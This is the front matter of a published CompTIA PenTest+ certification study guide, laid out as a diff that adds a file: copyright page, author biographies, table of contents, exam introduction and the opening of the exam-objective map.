@@ -1,0 +1,2421 @@
+CompTIA®
+PenTest+ Study Guide
+
+CompTIA®
+PenTest+ Study Guide
+Exam PT0-001
+Mike Chapple
+David Seidl
+
+Senior Acquisitions Editor: Kenyon Brown
+Development Editor: Jim ComptonTechnical Editor: Jeff Parker Senior Production Editor: Christine O’ConnorCopy Editor: Judy FlynnContent Enablement and Operations Manager: Pete Gaughan Production Manager: Kathleen WisorExecutive Editor: Jim MinatelBook Designers: Judy Fung and Bill GibsonProofreader: Louise Watson, Word One New York Indexer: Ted LauxProject Coordinator, Cover: Brent SavageCover Designer: WileyCover Image: Getty Images Inc./Jeremy Woodhouse 
+Copyright © 2019 by John Wiley & Sons, Inc., Indianapolis, IndianaPublished simultaneously in CanadaISBN: 978-1-119-50422-1    
+ISBN: 978-1-119-50425-2 (ebk.)  
+ISBN: 978-1-119-50424-5 (ebk.)
+Manufactured in the United States of America No part of this publication may be reproduced, stored in a retrieval system or transmitted in any form or 
+by any means, electronic, mechanical, photocopying, recording, scanning or otherwise, except as permit-ted under Sections 107 or 108 of the 1976 United States Copyright Act, without either the prior written permission of the Publisher, or authorization through payment of the appropriate per-copy fee to the Copyright Clearance Center, 222 Rosewood Drive, Danvers, MA 01923, (978) 750-8400, fax (978) 646-8600. Requests to the Publisher for permission should be addressed to the Permissions Department, John Wiley & Sons, Inc., 111 River Street, Hoboken, NJ 07030, (201) 748-6011, fax (201) 748-6008, or online at 
+http://www.wiley.com/go/permissions .
+Limit of Liability/Disclaimer of Warranty: The publisher and the author make no representations or war-ranties with respect to the accuracy or completeness of the contents of this work and specifically disclaim all warranties, including without limitation warranties of fitness for a particular purpose. No warranty may be created or extended by sales or promotional materials. The advice and strategies contained herein may not be suitable for every situation. This work is sold with the understanding that the publisher is not engaged in rendering legal, accounting, or other professional services. If professional assistance is required, the services of a competent professional person should be sought. Neither the publisher nor the author shall be liable for damages arising herefrom. The fact that an organization or Web site is referred to in this work as a citation and/or a potential source of further information does not mean that the author or the publisher endorses the information the organization or Web site may provide or recommendations it may make. Further, readers should be aware that Internet Web sites listed in this work may have changed or disappeared between when this work was written and when it is read.
+For general information on our other products and services or to obtain technical support, please contact 
+our Customer Care Department within the U.S. at (877) 762-2974, outside the U.S. at (317) 572-3993 or fax (317) 572-4002.
+Wiley publishes in a variety of print and electronic formats and by print-on-demand. Some material 
+included with standard print versions of this book may not be included in e-books or in print-on-demand. If this book refers to media such as a CD or DVD that is not included in the version you purchased, you may download this material at 
+http://booksupport.wiley.com . For more information about Wiley prod-
+ucts, visit www.wiley.com .
+Library of Congress Control Number: 2018958333
+TRADEMARKS: Wiley, the Wiley logo, and the Sybex logo are trademarks or registered trademarks of 
+John Wiley & Sons, Inc. and/or its affiliates, in the United States and other countries, and may not be used without written permission. CompTIA and PenTest+ are trademarks or registered trademarks of CompTIA, Inc. All other trademarks are the property of their respective owners. John Wiley & Sons, Inc. is not  associated with any product or vendor mentioned in this book.
+10 9 8 7 6 5 4 3 2 1
+
+This book is dedicated to Ron Kraemer—a mentor, friend,  
+and wonderful boss.
+
+Acknowledgments
+Books like this involve work from many people, and as authors, we truly appreciate the 
+hard work and dedication that the team at Wiley shows. We would especially like to thank Senior Acquisitions Editor Kenyon Brown. We have worked with Ken on multiple projects and consistently enjoy our work with him.
+We also greatly appreciated the editing and production team for the book, including 
+Jim Compton, our developmental editor, whose prompt and consistent oversight got this book out the door, and Christine O’Connor, our production editor, who guided us through layouts, formatting, and final cleanup to produce a great book. We’d also like to thank our technical editor, Jeff Parker, who provided us with thought-provoking questions and tech-nical insight throughout the process. We would also like to thank the many behind-the-scenes contributors, including the graphics, production, and technical teams who make the book and companion materials into a finished product.
+Our agent, Carole Jelen of Waterside Productions, continues to provide us with wonder-
+ful opportunities, advice, and assistance throughout our writing careers.
+Finally, we would like to thank our families, friends, and significant others who support 
+us through the late evenings, busy weekends, and long hours that a book like this requires to write, edit, and get to press.
+
+About the Authors
+Mike Chapple, PhD, Security+, CISSP, CISA, PenTest+, 
+CySA+, is an associate teaching professor of IT, analytics, and operations at the University of Notre Dame. He is also the academic director of the University’s master’s program in  business analytics.
+Mike is a cybersecurity professional with over 20 years of 
+experience in the field. Prior to his current role, Mike served as senior director for IT service delivery at Notre Dame, where he oversaw the University’s cybersecurity program, cloud com-puting efforts, and other areas. Mike also previously served as 
+chief information officer of Brand Institute and an information security researcher with the National Security Agency and the U.S. Air Force.
+Mike is a frequent contributor to several magazines and websites and is the author or 
+coauthor of more than 25 books, including CISSP Official (ISC)
+2 Study Guide , CISSP 
+Official (ISC)2 Practice Tests, CompTIA CySA+ Study Guide: Exam CS0-001 , and 
+CompTIA CySA+ Practice Tests: Exam CS0-001 , all from Wiley, and Cyberwarfare: 
+Information Operations in a Connected World (Jones and Bartlett, 2014).
+Mike offers free study groups for the PenTest+, CySA+, Security+, CISSP, and SSCP cer-
+tifications at his website, certmike.com.
+David Seidl, CISSP, PenTest+, CySA+, GCIH, GPEN, is the senior director for campus technology services at the University of Notre Dame. As the senior director for CTS, David is responsible for Amazon AWS cloud operations, vir-tualization, enterprise storage, platform and operating system support, database and ERP administration and services, iden-tity and access management, application services, enterprise content management, digital signage, labs, lecterns, and aca-demic printing and a variety of other services and systems.
+During his over 22 years in information technology, David 
+has served in a variety of leadership, technical, and information security roles, including leading Notre Dame’s information security team as director of information security. He has written books on security certification and cyberwarfare, including coauthoring CompTIA CySA+ Study Guide: Exam CS0-001 , CompTIA CySA+ Practice Tests: Exam CS0-001 , 
+and CISSP (ISC)
+2 Official Practice Tests from Wiley and Cyberwarfare: Information 
+Operations in a Connected World (Jones and Bartlett, 2014).
+David holds a bachelor’s degree in communication technology and a master’s degree in 
+information security from Eastern Michigan University.
+
+
+Contents at a Glance
+Introduction  xxv
+Assessment Test  lvi
+Chapter 1 Penetration Testing  1
+Chapter 2 Planning and Scoping Penetration Tests  31
+Chapter 3 Information Gathering  57
+Chapter 4 Vulnerability Scanning  99
+Chapter 5 Analyzing Vulnerability Scans  137
+Chapter 6 Exploit and Pivot  181
+Chapter 7 Exploiting Network Vulnerabilities  223
+Chapter 8 Exploiting Physical and Social Vulnerabilities  259
+Chapter 9 Exploiting Application Vulnerabilities  283
+Chapter 10 Exploiting Host Vulnerabilities  321
+Chapter 11 Scripting for Penetration Testing  363
+Chapter 12 Reporting and Communication  405
+Appendix    Answers to Review Questions  425
+Index  447
+
+Contents
+Introduction  xxv
+Assessment Test  lvi
+Chapter 1 Penetration Testing  1
+What Is Penetration Testing?  2
+Cybersecurity Goals  2
+Adopting the Hacker Mind-Set  4
+Reasons for Penetration Testing  5
+Benefits of Penetration Testing  5
+Regulatory Requirements for Penetration Testing  6
+Who Performs Penetration Tests?  8
+Internal Penetration Testing Teams  8
+External Penetration Testing Teams  9
+Selecting Penetration Testing Teams  9
+The CompTIA Penetration Testing Process  10
+Planning and Scoping  11
+Information Gathering and Vulnerability Identification  11
+Attacking and Exploiting  12
+Reporting and Communicating Results  13
+The Cyber Kill Chain  13
+Reconnaissance  15
+Weaponization  15
+Delivery  16
+Exploitation  16
+Installation  16
+Command and Control  16
+Actions on Objectives  17
+Tools of the Trade  17
+Reconnaissance  19
+Vulnerability Scanners  20
+Social Engineering  21
+Credential-Testing Tools  21
+Debuggers  21
+Software Assurance  22
+Network Testing  22
+Remote Access  23
+Exploitation  23
+Summary  23
+Exam Essentials  24
+
+xvi Contents
+Lab Exercises  25
+Activity 1.1: Adopting the Hacker Mind-Set  25
+Activity 1.2: Using the Cyber Kill Chain  25
+Review Questions  26
+Chapter 2 Planning and Scoping Penetration Tests  31
+Scoping and Planning Engagements  35
+Assessment Types  36
+White Box, Black Box, or Gray Box?  36
+The Rules of Engagement  38
+Scoping Considerations: A Deeper Dive  40
+Support Resources for Penetration Tests  42
+Key Legal Concepts for Penetration Tests  45
+Contracts  45
+Data Ownership and Retention  46
+Authorization  46
+Environmental Differences  46
+Understanding Compliance-Based Assessments  48
+Summary  50
+Exam Essentials  51
+Lab Exercises  52
+Review Questions  53
+Chapter 3 Information Gathering  57
+Footprinting and Enumeration  60
+OSINT  61
+Location and Organizational Data  64
+Infrastructure and Networks  67
+Security Search Engines  72
+Active Reconnaissance and Enumeration  74
+Hosts  75
+Services  75
+Networks, Topologies, and Network Traffic  81
+Packet Crafting and Inspection  83
+Enumeration  84
+Information Gathering and Code  88
+Information Gathering and Defenses  89
+Defenses Against Active Reconnaissance  90
+Preventing Passive Information Gathering  90
+Summary  90
+Exam Essentials  91
+Lab Exercises  92
+Activity 3.1: Manual OSINT Gathering  92
+Activity 3.2: Exploring Shodan  93
+Activity 3.3: Running a Nessus Scan  93
+Review Questions  94
+
+Contents  xvii
+Chapter 4 Vulnerability Scanning  99
+Identifying Vulnerability Management Requirements  102
+Regulatory Environment  102
+Corporate Policy  106
+Support for Penetration Testing  106
+Identifying Scan Targets  106
+Determining Scan Frequency  107
+Configuring and Executing Vulnerability Scans  109
+Scoping Vulnerability Scans  110
+Configuring Vulnerability Scans  111
+Scanner Maintenance  117
+Software Security Testing  119
+Analyzing and Testing Code  120
+Web Application Vulnerability Scanning  121
+Developing a Remediation Workflow  125
+Prioritizing Remediation  126
+Testing and Implementing Fixes  127
+Overcoming Barriers to Vulnerability Scanning  127
+Summary  129
+Exam Essentials  129
+Lab Exercises  130
+Activity 4.1: Installing a Vulnerability Scanner  130
+Activity 4.2: Running a Vulnerability Scan  130
+Activity 4.3: Developing a Penetration Test  
+Vulnerability Scanning Plan  131
+Review Questions  132
+Chapter 5 Analyzing Vulnerability Scans  137
+Reviewing and Interpreting Scan Reports  138
+Understanding CVSS  142
+Validating Scan Results  147
+False Positives  147
+Documented Exceptions  147
+Understanding Informational Results  148
+Reconciling Scan Results with Other Data Sources  149
+Trend Analysis  149
+Common Vulnerabilities  150
+Server and Endpoint Vulnerabilities  151
+Network Vulnerabilities  161
+Virtualization Vulnerabilities  167
+Internet of Things (IoT)  169
+Web Application Vulnerabilities  170
+
+xviii Contents
+Summary  172
+Exam Essentials  173
+Lab Exercises  174
+Activity 5.1: Interpreting a Vulnerability Scan  174
+Activity 5.2: Analyzing a CVSS Vector  174
+Activity 5.3: Developing a Penetration Testing Plan  175
+Review Questions  176
+Chapter 6 Exploit and Pivot  181
+Exploits and Attacks  184
+Choosing Targets  184
+Identifying the Right Exploit  185
+Exploit Resources  188
+Developing Exploits  189
+Exploitation Toolkits  191
+Metasploit  192
+PowerSploit  198
+Exploit Specifics  199
+RPC/DCOM  199
+PsExec  199
+PS Remoting/WinRM  199
+WMI  200
+Scheduled Tasks and cron Jobs  200
+SMB  201
+RDP  202
+Apple Remote Desktop  203
+VNC  203
+X-Server Forwarding  203
+Telnet  203
+SSH 204
+Leveraging Exploits  204
+Common Post-Exploit Attacks  204
+Privilege Escalation  207
+Social Engineering  208
+Persistence and Evasion  209
+Scheduled Jobs and Scheduled Tasks  209
+Inetd Modification  210
+Daemons and Services  210
+Back Doors and Trojans  210
+New Users  211
+Pivoting  211
+Covering Your Tracks  212
+Summary  213
+Exam Essentials  214
+
+Contents  xix
+Lab Exercises  215
+Activity 6.1: Exploit  215
+Activity 6.2: Discovery  215
+Activity 6.3: Pivot  216
+Review Questions  217
+Chapter 7 Exploiting Network Vulnerabilities  223
+Conducting Network Exploits  226
+VLAN Hopping  226
+Network Proxies  228
+DNS Cache Poisoning  228
+Man-in-the-Middle  229
+NAC Bypass  233
+DoS Attacks and Stress Testing  234
+Exploiting Windows Services  236
+NetBIOS Name Resolution Exploits  236
+SMB Exploits  240
+Exploiting Common Services  240
+SNMP Exploits  241
+SMTP Exploits  242
+FTP Exploits  243
+Samba Exploits  244
+Wireless Exploits  245
+Evil Twins and Wireless MITM  245
+Other Wireless Protocols and Systems  247
+RFID Cloning  248
+Jamming  249
+Repeating  249
+Summary  250
+Exam Essentials  251
+Lab Exercises  251
+Activity 7.1: Capturing Hashes  251
+Activity 7.2: Brute-Forcing Services  252
+Activity 7.3: Wireless Testing  253
+Review Questions  254
+Chapter 8 Exploiting Physical and Social Vulnerabilities  259
+Physical Facility Penetration Testing  262
+Entering Facilities  262
+Information Gathering  266
+Social Engineering  266
+In-Person Social Engineering  267
+Phishing Attacks  269
+
+xx Contents
+Website-Based Attacks  270
+Using Social Engineering Tools  270
+Summary  273
+Exam Essentials  274
+Lab Exercises  275
+Activity 8.1: Designing a Physical Penetration Test  275
+Activity 8.2: Brute-Forcing Services   276
+Activity 8.3: Using BeEF  276
+Review Questions  278
+Chapter 9 Exploiting Application Vulnerabilities  283
+Exploiting Injection Vulnerabilities  287
+Input Validation  287
+Web Application Firewalls  288
+SQL Injection Attacks  289
+Code Injection Attacks  292
+Command Injection Attacks  293
+Exploiting Authentication Vulnerabilities  293
+Password Authentication  294
+Session Attacks  295
+Kerberos Exploits  298
+Exploiting Authorization Vulnerabilities  299
+Insecure Direct Object References  299
+Directory Traversal  300
+File Inclusion  301
+Exploiting Web Application Vulnerabilities  302
+Cross-Site Scripting (XSS)  302
+Cross-Site Request Forgery (CSRF/XSRF)  305
+Clickjacking  305
+Unsecure Coding Practices  306
+Source Code Comments  306
+Error Handling  306
+Hard-Coded Credentials  307
+Race Conditions  308
+Unprotected APIs  308
+Unsigned Code  308
+Application Testing Tools  308
+Static Application Security Testing (SAST)  309
+Dynamic Application Security Testing (DAST)  310
+Mobile Tools  313
+Summary  313
+Exam Essentials  313
+
+Contents  xxi
+Lab Exercises  314
+Activity 9.1: Application Security Testing Techniques  314
+Activity 9.2: Using the ZAP Proxy  314
+Activity 9.3: Creating a Cross-Site Scripting Vulnerability  315
+Review Questions  316
+Chapter 10 Exploiting Host Vulnerabilities  321
+Attacking Hosts  325
+Linux  325
+Windows  331
+Cross-Platform Exploits  338
+Remote Access  340
+SSH 340
+NETCAT  and Ncat  341
+Proxies and Proxychains  341
+Metasploit and Remote Access  342
+Attacking Virtual Machines and Containers  342
+Virtual Machine Attacks  343
+Container Attacks  344
+Physical Device Security  345
+Cold-Boot Attacks  345
+Serial Consoles  345
+JTAG Debug Pins and Ports  346
+Attacking Mobile Devices  347
+Credential Attacks  348
+Credential Acquisition  348
+Offline Password Cracking  349
+Credential Testing and Brute-Forcing Tools  350
+Wordlists and Dictionaries  351
+Summary  352
+Exam Essentials  353
+Lab Exercises  354
+Activity 10.1: Dumping and Cracking the Windows SAM  
+and Other Credentials  354
+Activity 10.2: Cracking Passwords Using Hashcat  355
+Activity 10.3: Setting Up a Reverse Shell  
+and a Bind Shell  356
+Review Questions  358
+Chapter 11 Scripting for Penetration Testing  363
+Scripting and Penetration Testing  364
+Bash  365
+PowerShell  366
+
+xxii Contents
+Ruby  367
+Python  368
+Variables, Arrays, and Substitutions  368
+Bash  370
+PowerShell  371
+Ruby  371
+Python  372
+Comparison Operations  372
+String Operations  373
+Bash  375
+PowerShell  376
+Ruby  377
+Python  378
+Flow Control  378
+Conditional Execution  379
+For Loops  384
+While Loops  389
+Input and Output (I/O)  394
+Redirecting Standard Input and Output  394
+Error Handling  395
+Bash  395
+PowerShell  396
+Ruby  396
+Python  396
+Summary  397
+Exam Essentials  397
+Lab Exercises  398
+Activity 11.1: Reverse DNS Lookups  398
+Activity 11.2: Nmap Scan  398
+Review Questions  399
+Chapter 12 Reporting and Communication  405
+The Importance of Communication  408
+Defining a Communication Path  408
+Communication Triggers  408
+Goal Reprioritization  409
+Recommending Mitigation Strategies  409
+Finding: Shared Local Administrator Credentials  411
+Finding: Weak Password Complexity  411
+Finding: Plain Text Passwords  413
+Finding: No Multifactor Authentication  413
+Finding: SQL Injection  414
+Finding: Unnecessary Open Services  415
+
+Contents  xxiii
+Writing a Penetration Testing Report  415
+Structuring the Written Report  415
+Secure Handling and Disposition of Reports  417
+Wrapping Up the Engagement  418
+Post-Engagement Cleanup  418
+Client Acceptance  419
+Lessons Learned  419
+Follow-Up Actions/Retesting  419
+Attestation of Findings  419
+Summary  420
+Exam Essentials  420
+Lab Exercises  421
+Activity 12.1: Remediation Strategies  421
+Activity 12.2: Report Writing  421
+Review Questions  422
+Appendix   Answers to Review Questions  425
+Chapter 1: Penetration Testing  426
+Chapter 2: Planning and Scoping Penetration Tests  427
+Chapter 3: Information Gathering  429
+Chapter 4: Vulnerability Scanning   431
+Chapter 5: Analyzing Vulnerability Scans  433
+Chapter 6: Exploit and Pivot  434
+Chapter 7: Exploiting Network Vulnerabilities  436
+Chapter 8: Exploiting Physical and Social Vulnerabilities  438
+Chapter 9: Exploiting Application Vulnerabilities  440
+Chapter 10: Exploiting Host Vulnerabilities  442
+Chapter 11: Script for Penetration Testing  444
+Chapter 12: Reporting and Communication  445
+Index  447
+
+Introduction
+The CompTIA PenTest+ Study Guide: Exam PT0-001 provides accessible explanations 
+and real-world knowledge about the exam objectives that make up the PenTest+ certifica-tion. This book will help you to assess your knowledge before taking the exam, as well as provide a stepping stone to further learning in areas where you may want to expand your skill set or expertise.
+Before you tackle the PenTest+ exam, you should already be a security practitioner. 
+CompTIA suggests that test-takers should have intermediate-level skills based on their cybersecurity pathway. You should also be familiar with at least some of the tools and tech-niques described in this book. You don’t need to know every tool, but understanding how to use existing experience to approach a new scenario, tool, or technology that you may not know is critical to passing the PenTest+ exam.
+CompTIA
+CompTIA is a nonprofit trade organization that offers certification in a variety of IT areas, ranging from the skills that a PC support technician needs, which are covered in the A+ exam, to advanced certifications like the CompTIA Advanced Security Practitioner, or CASP, certification. CompTIA divides its exams into three categories based on the skill level required for the exam and what topics it covers, as shown in the following table:
+Beginner/Novice Intermediate Advanced
+IT Fundamentals
+A+Network+Security+CySA+PenTest+CASP
+CompTIA recommends that practitioners follow a cybersecurity career path that begins 
+with the IT fundamentals and A+ exam and proceeds to include the Network+ and Security+ 
+credentials to complete the foundation. From there, cybersecurity professionals may choose the PenTest+ and/or Cybersecurity Analyst+ (CySA+) certifications before attempting the CompTIA Advanced Security Practitioner (CASP) certification as a capstone credential.
+The CySA+ and PenTest+ exams are more advanced exams, intended for professionals 
+with hands-on experience who also possess the knowledge covered by the prior exams.
+CompTIA certifications are ISO and ANSI accredited, and they are used throughout 
+multiple industries as a measure of technical skill and knowledge. In addition, CompTIA certifications, including the Security+ and the CASP, have been approved by the U.S. gov-ernment as Information Assurance baseline certifications and are included in the State Department’s Skills Incentive Program.
+
+xxvi Introduction
+The PenTest+ Exam
+The PenTest+ exam is designed to be a vendor-neutral certification for penetration testers. It 
+is designed to assess current penetration testing, vulnerability assessment, and vulnerability management skills with a focus on network resiliency testing. Successful test-takers will prove their ability plan and scope assessments, handle legal and compliance requirements, and perform vulnerability scanning and penetration testing activities using a variety of tools and techniques, and then analyze the results of those activities.
+It covers five major domains:
+1. Planning and Scoping
+2. Information Gathering and Vulnerability Identification
+3. Attacks and Exploits
+4. Penetration Testing Tools
+5. Reporting and Communication
+These five areas include a range of subtopics, from scoping penetration tests to perform-
+ing host enumeration and exploits, while focusing heavily on scenario-based learning.
+The PenTest+ exam fits between the entry-level Security+ exam and the CompTIA 
+Advanced Security Practitioner (CASP) certification, providing a mid-career certification for those who are seeking the next step in their certification and career path while special-izing in penetration testing or vulnerability management.
+The PenTest+ exam is conducted in a format that CompTIA calls “performance-based 
+assessment.” This means that the exam uses hands-on simulations using actual security tools and scenarios to perform tasks that match those found in the daily work of a security practitioner. There may be multiple types of exam questions, such as multiple-choice, fill-in-the-blank, multiple-response, drag-and-drop, and image-based problems.
+CompTIA recommends that test-takers have three or four years of information security–
+related experience before taking this exam and that they have taken the Security+ exam or have equivalent experience, including technical, hands-on expertise. The exam costs $346 in the United States, with roughly equivalent prices in other locations around the globe. More details about the PenTest+ exam and how to take it can be found at
+https://certification.comptia.org/certifications/pentest
+Study and Exam Preparation Tips
+A test preparation book like this cannot teach you every possible security software pack-age, scenario, and specific technology that may appear on the exam. Instead, you should focus on whether you are familiar with the type or category of technology, tool, process, or scenario presented as you read the book. If you identify a gap, you may want to find addi-tional tools to help you learn more about those topics.
+
+Introduction  xxvii
+Additional resources for hands-on exercises include the following:
+■ ■Exploit-Exercises.com provides virtual machines, documentation, and challenges cov -
+ering a wide range of security issues at https://exploit-exercises.com/ .
+■ ■Hacking-Lab provides capture-the-flag (CTF) exercises in a variety of fields at 
+https://www.hacking-lab.com/index.html .
+■ ■The OWASP Hacking Lab provides excellent web application–focused exercises at 
+https://www.owasp.org/index.php/OWASP_Hacking_Lab .
+■ ■PentesterLab provides a subscription-based access to penetration testing exercises at 
+https://www.pentesterlab.com/exercises/ .
+■ ■The InfoSec Institute provides online capture-the-flag activities with bounties for writ-
+ten explanations of successful hacks at http://ctf.infosecinstitute.com/ .
+Since the exam uses scenario-based learning, expect the questions to involve analysis 
+and thought rather than relying on simple memorization. As you might expect, it is impos-sible to replicate that experience in a book, so the questions here are intended to help you be confident that you know the topic well enough to think through hands-on exercises.
+Taking the Exam
+Once you are fully prepared to take the exam, you can visit the CompTIA website to pur-chase your exam voucher:
+www.comptiastore.com/Articles.asp?ID=265&category=vouchers
+CompTIA partners with Pearson VUE’s testing centers, so your next step will be to 
+locate a testing center near you. In the United States, you can do this based on your address or your zip code, while non-U.S. test-takers may find it easier to enter their city and country. You can search for a test center near you at
+http://www.pearsonvue.com/comptia/locate/
+Now that you know where you’d like to take the exam, simply set up a Pearson VUE 
+testing account and schedule an exam:
+https://certification.comptia.org/testing/schedule-exam
+On the day of the test, take two forms of identification, and make sure to show up with 
+plenty of time before the exam starts. Remember that you will not be able to take your notes, electronic devices (including smartphones and watches), or other materials in with you.
+After the PenTest+ Exam
+Once you have taken the exam, you will be notified of your score immediately, so you’ll know if you passed the test right away. You should keep track of your score report with your exam registration records and the email address you used to register for the exam. If you’ve passed, you’ll receive a handsome certificate, similar to the one shown here:
+
+xxviii Introduction
+Maintaining Your Certification
+CompTIA certifications must be renewed on a periodic basis. To renew your certification, 
+you can either pass the most current version of the exam, earn a qualifying higher-level CompTIA or industry certification, or complete sufficient continuing education activities to earn enough continuing education units (CEUs) to renew it.
+CompTIA provides information on renewals via their website at
+https://certification.comptia.org/continuing-education/how-to-renew
+When you sign up to renew your certification, you will be asked to agree to the CE pro-
+gram’s Code of Ethics, to pay a renewal fee, and to submit the materials required for your chosen renewal method.
+A full list of the industry certifications you can use to acquire CEUs toward renewing 
+the PenTest+ can be found at
+https://certification.comptia.org/continuing-education/choose/renewal-
+options
+
+Introduction  xxix
+What Does This Book Cover?
+This book is designed to cover the five domains included in the PenTest+ exam:
+Chapter 1: Penetration Testing   Learn the basics of penetration testing as you begin an 
+in-depth exploration of the field. In this chapter, you will learn why organizations conduct 
+penetration testing and the role of the penetration test in a cybersecurity program.
+Chapter 2: Planning and Scoping Penetration Tests   Proper planning is critical to a pen-
+etration test. In this chapter you will learn how to define the rules of engagement, scope, 
+budget, and other details that need to be determined before a penetration test starts. Details of contracts, compliance and legal concerns, and authorization are all discussed so that you can make sure you are covered before a test starts.
+Chapter 3: Information Gathering
+  Gathering information is one of the earliest stages of 
+a penetration test. In this chapter you will learn how to gather open-source intelligence 
+(OSINT) via passive means. Once you have OSINT, you can leverage the active  scanning 
+and enumeration techniques and tools you will learn about in the second half of the chapter.
+Chapter 4: Vulnerability Scanning   Managing vulnerabilities helps to keep your systems 
+secure. In this chapter you will learn how to conduct vulnerability scans and use them as an 
+important information source for penetration testing.
+Chapter 5: Analyzing Vulnerability Scans   Vulnerability reports can contain huge amounts 
+of data about potential problems with systems. In this chapter you will learn how to read 
+and analyze a vulnerability scan report, what CVSS scoring is and what it means, as well as how to choose the appropriate actions to remediate the issues you have found. Along the way, you will explore common types of vulnerabilities, their impact on systems and net-works, and how they might be exploited during a penetration test.
+Chapter 6: Exploit and Pivot
+  Once you have a list of vulnerabilities, you can move on to 
+prioritizing the exploits based on the likelihood of success and availability of attack meth-
+ods. In this chapter you will explore common attack techniques and tools and when to use them. Once you have gained access, you can pivot to other systems or networks that may not have been accessible previously. You will learn tools and techniques that are useful for lateral movement once you’re inside of a network’s security boundaries, how to cover your tracks, and how to hide the evidence of your efforts.
+Chapter 7: Exploiting Network Vulnerabilities
+  Penetration testers often start with network 
+attacks against common services. In this chapter you will explore the most frequently attacked 
+services, including NetBIOS, SMB, SNMP, and others. You will learn about man-in-the-  
+middle attacks, network-specific techniques, and how to attack wireless networks and systems.
+Chapter 8: Exploiting Physical and Social Vulnerabilities   Humans are the most vulner-
+able part of an organization’s security posture, and penetration testers need to know how 
+to exploit the human element of an organization. In this chapter you will explore social engineering methods, motivation techniques, and social engineering tools. Once you know how to leverage human behavior, you will explore how to gain and leverage physical access to buildings and other secured areas.
+
+xxx Introduction
+Chapter 9: Exploiting Application Vulnerabilities   Applications are the go-to starting 
+point for testers and hackers alike. If an attacker can break through the security of a web 
+application and access the backend systems supporting that application, they often have the starting point they need to wage a full-scale attack. In this chapter we examine many of the application vulnerabilities that are commonly exploited during penetration tests.
+Chapter 10: Exploiting Host Vulnerabilities
+  Attacking hosts relies on understanding 
+operating system–specific vulnerabilities for Windows and Linux as well as common prob-
+lems found on almost all operating systems. In this chapter you will explore privilege esca-lation, OS-specific exploits, sandbox escape, physical device security, credential capture, and password recovery tools. You will also explore a variety of tools you can leverage to compromise a host or exploit it further once you have access.
+Chapter 11: Scripting for Penetration Testing
+  Scripting languages provide a means to 
+automate the repetitive tasks of penetration testing. Penetration testers do not need to be 
+software engineers. Generally speaking, pen-testers don’t write extremely lengthy code or develop applications that will be used by many other people. The primary development skill that a penetration tester should acquire is the ability to read fairly simple scripts written in a variety of common languages and adapt them to their own unique needs. That’s what we’ll explore in this chapter.
+Chapter 12: Reporting and Communication
+  Penetration tests are only useful to the orga-
+nization if the penetration testers are able to effectively communicate the state of the orga-
+nization to management and technical staff. In this chapter we turn our attention to that crucial final phase of a penetration test: reporting and communicating our results.
+Practice Exam
+  Once you have completed your studies, the practice exam will provide you 
+with a chance to test your knowledge. Use this exam to find places where you may need to 
+study more or to verify that you are ready to tackle the exam. We’ll be rooting for you!
+Appendix: Answers to Chapter Review Questions   The Appendix has answers to the 
+review questions you will find at the end of each chapter.
+Objective Mapping
+The following listing summarizes how the major Pentest+ objective areas map to the chap-
+ters in this book. If you want to study a specific domain, this mapping can help you identify where to focus your reading.
+Planning and Scoping: Chapter 2
+Information Gathering and Vulnerability Identification: Chapters 3, 4, 5, 6, 10Attacks and Exploits: Chapters 6, 7, 8, 9, 10Penetration Testing Tools: Chapters 3, 4, 5, 6, 7, 8, 9, 10, 11, 12Reporting and Communications: Chapter 12
+Later in this introduction you’ll find a detailed map showing where every objective topic 
+is covered.
+
+Introduction  xxxi
+ The book is written to build your knowledge as you progress through it, so starting at 
+the beginning is a good idea. Each chapter includes notes on important content and practice 
+questions to help you test your knowledge. Once you are ready, a complete practice test is provided to assess your knowledge.   
+ Study Guide Elements 
+ This study guide uses a number of common elements to help you prepare. These include the following: 
+  Summaries   The summary section of each chapter briefl  y explains the chapter, allowing 
+you to easily understand what it covers.   Exam Essentials    The exam essentials focus on major exam topics and critical knowledge 
+that you should take into the test. The exam essentials focus on the exam objectives pro-
+vided by CompTIA. 
+  Chapter Review Questions   A set of questions at the end of each chapter will help you 
+assess your knowledge and whether you are ready to take the exam based on your knowl-
+edge of that chapter’s topics. 
+  Lab Exercises    The lab exercises provide more in-depth practice opportunities to expand 
+your skills and to better prepare for performance-based testing on the PenTest+ exam.   Real-World Scenarios   The real-world scenarios included in each chapter tell stories and pro-
+vide examples of how topics in the chapter look from the point of view of a security profes-
+sional. They include current events, personal experience, and approaches to actual problems.   
+ Interactive Online Learning Environment 
+ The interactive online learning environment that accompanies  CompTIA PenTest+ Study 
+Guide: Exam PT0-001  provides a test bank with study tools to help you prepare for the certifi  cation exam—and increase your chances of passing it the fi  rst time! The test bank includes the following elements: 
+  Sample Tests   All of the questions in this book are provided, including the assessment test, 
+which you’ll fi  nd at the end of this introduction, and the chapter tests that include the review 
+questions at the end of each chapter. In addition, there is a practice exam. Use these questions to test your knowledge of the study guide material. The online test bank runs on multiple devices. 
+  Flashcards    Questions are provided in digital fl  ashcard format (a question followed by a 
+single correct answer). You can use the fl  ashcards to reinforce your learning and provide 
+last-minute test prep before the exam. 
+  Other Study Tools   A glossary of key terms from this book and their defi  nitions is avail-
+able as a fully searchable PDF. 
+        
+ Go to  http://www.wiley.com/go/sybextestprep   to register and gain 
+access to this interactive online learning environment and test bank with 
+study tools.      
+
+xxxii Introduction
+CompTIA PenTest+ Certification Exam 
+Objectives
+The CompTIA PenTest+ Study Guide has been written to cover every PenTest+ exam objec-
+tive at a level appropriate to its exam weighting. The following table provides a breakdown of this book’s exam coverage, showing you the weight of each section and the chapter where each objective or subobjective is covered.
+Domain Percentage of Exam
+1.0 Planning and Scoping 15%
+2.0 Information Gathering and Vulnerability Identification 22%
+3.0 Attacks and Exploits 30%
+4.0 Penetration Testing Tools 17%
+5.0 Reporting and Communication 16%
+Total 100%
+1.0 Planning and Scoping
+Exam Objective Chapter
+1.1 Explain the importance of planning for an engagement. 2
+Understanding the target audience 2
+Rules of engagement 2
+Communication escalation path 2
+Resources and requirements 2
+Confidentiality of findings 2
+Known vs. unknown 2
+Budget 2
+Impact  analysis and remediation timelines 2
+
+Introduction  xxxiii
+Exam Objective Chapter
+Disclaimers 2
+Point-in-time assessment 2
+Comprehensiveness 2
+Technical constraints 2
+Support resources 2
+WSDL/WADL 2
+SOAP project file 2
+SDK documentation 2
+Swagger document 2
+XSD 2
+Sample application requests 2
+Architectural diagrams 2
+1.2 Explain key legal concepts. 2
+Contracts 2
+SOW 2
+MSA 2
+NDA 2
+Environmental differences 2
+Export restrictions 2
+Local and national government restrictions 2
+Corporate policies 2
+
+xxxiv Introduction
+Exam Objective Chapter
+Written authorization 2
+Obtain signature from proper signing authority 2
